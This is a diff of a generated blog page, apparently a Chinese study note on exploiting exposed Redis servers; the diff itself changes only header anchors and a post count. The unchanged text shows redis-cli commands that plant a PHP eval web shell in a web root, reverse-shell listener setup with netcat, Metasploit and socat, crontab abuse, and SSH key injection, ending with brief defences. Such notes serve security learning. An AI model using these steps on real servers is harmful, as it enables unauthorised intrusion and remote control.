@@ -160,7 +160,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-count">127</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -249,7 +249,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="Redis-常见用途">Redis 常见用途</h3>
+    <div class="post-body" itemprop="articleBody"><h3><span id="redis-chang-jian-yong-tu">Redis 常见用途</span><a href="#redis-chang-jian-yong-tu" class="header-anchor">#</a></h3>
 <p>Remote Dictionary Service</p>
 <ul>
 <li>缓存</li>
@@ -260,28 +260,28 @@
 <li>标签</li>
 <li>排行榜</li>
 </ul>
-<h3 id="Redis-持久化">Redis 持久化</h3>
+<h3><span id="redis-chi-jiu-hua">Redis 持久化</span><a href="#redis-chi-jiu-hua" class="header-anchor">#</a></h3>
 <p>RDB: Redis DataBase (默认)<br>
 AOF: Append Only File</p>
-<h2 id="Webshell-提权">Webshell 提权</h2>
+<h2><span id="webshell-ti-quan">Webshell 提权</span><a href="#webshell-ti-quan" class="header-anchor">#</a></h2>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h example.com -p 6379</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /www/admin/localhost_80/wwwroot</span><br><span class="line">config <span class="built_in">set</span> dbfilename redis.php</span><br><span class="line"><span class="built_in">set</span> x “&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[hajimi]): ?&gt;”</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h2 id="反弹连接">反弹连接</h2>
-<h3 id="原因">原因</h3>
+<h2><span id="fan-dan-lian-jie">反弹连接</span><a href="#fan-dan-lian-jie" class="header-anchor">#</a></h2>
+<h3><span id="yuan-yin">原因</span><a href="#yuan-yin" class="header-anchor">#</a></h3>
 <ul>
 <li>内网，私有 IP</li>
 <li>IP 动态变化</li>
 <li>6379 端口不允许入方向</li>
 <li>一句话木马被杀软删除</li>
 </ul>
-<h3 id="监听">监听</h3>
+<h3><span id="jian-ting">监听</span><a href="#jian-ting" class="header-anchor">#</a></h3>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#netcat</span></span><br><span class="line">nc -lvp 7777</span><br><span class="line"></span><br><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment">#socat(kali)</span></span><br><span class="line">socat TCP-LISTEN:7777 -</span><br></pre></td></tr></table></figure>
-<h3 id="靶机建立反弹连接">靶机建立反弹连接</h3>
-<p><img data-src="/img/msb/17389164721036.jpg" alt=""></p>
-<p><img data-src="/img/msb/17389177981544.png" alt=""></p>
-<p><img data-src="/img/msb/17389167707220.png" alt=""></p>
+<h3><span id="ba-ji-jian-li-fan-dan-lian-jie">靶机建立反弹连接</span><a href="#ba-ji-jian-li-fan-dan-lian-jie" class="header-anchor">#</a></h3>
+<p><img data-src="/img/msb/17389164721036.jpg" alt></p>
+<p><img data-src="/img/msb/17389177981544.png" alt></p>
+<p><img data-src="/img/msb/17389167707220.png" alt></p>
 <p>注意防火墙</p>
-<h3 id="总结">总结</h3>
+<h3><span id="zong-jie">总结</span><a href="#zong-jie" class="header-anchor">#</a></h3>
 <p>流程：</p>
 <ol>
 <li>监听端口</li>
@@ -295,27 +295,27 @@ AOF: Append Only File</p>
 </ul>
 <p>执行方式：<br>
 访问或定时任务自动触发</p>
-<h3 id="定时任务">定时任务</h3>
+<h3><span id="ding-shi-ren-wu">定时任务</span><a href="#ding-shi-ren-wu" class="header-anchor">#</a></h3>
 <p>Linux crontab:<br>
-<img data-src="/img/msb/17389179459084.png" alt=""></p>
+<img data-src="/img/msb/17389179459084.png" alt></p>
 <p>cron 文件存储路径：<br>
 /var/spool/cron: 系统管理员制定的维护系统以及其他任务的 crontab<br>
 /etc/crontab: 对应周期的任务, daily, hourly, monthly, weekly</p>
-<h3 id="SSH-免密登录">SSH 免密登录</h3>
+<h3><span id="ssh-mian-mi-deng-lu">SSH 免密登录</span><a href="#ssh-mian-mi-deng-lu" class="header-anchor">#</a></h3>
 <p>Redis 利用 SSH Key 提权流程：</p>
 <ol>
 <li>控制机连接到 Redis</li>
 <li>向$HOME/.ssh/authorized_keys 写入公钥</li>
 <li>ssh -i ./id_rsa user@IP 使用私钥免密登录</li>
 </ol>
-<h3 id="其他利用方式">其他利用方式</h3>
+<h3><span id="qi-ta-li-yong-fang-shi">其他利用方式</span><a href="#qi-ta-li-yong-fang-shi" class="header-anchor">#</a></h3>
 <ul>
 <li>基于主从复制的 RCE</li>
 <li>jackson 反序列化利用</li>
 <li>lua RCE</li>
 <li>Redis 密码爆破</li>
 </ul>
-<h3 id="防御">防御</h3>
+<h3><span id="fang-yu">防御</span><a href="#fang-yu" class="header-anchor">#</a></h3>
 <ul>
 <li>限制访问 IP</li>
 <li>修改默认端口</li>
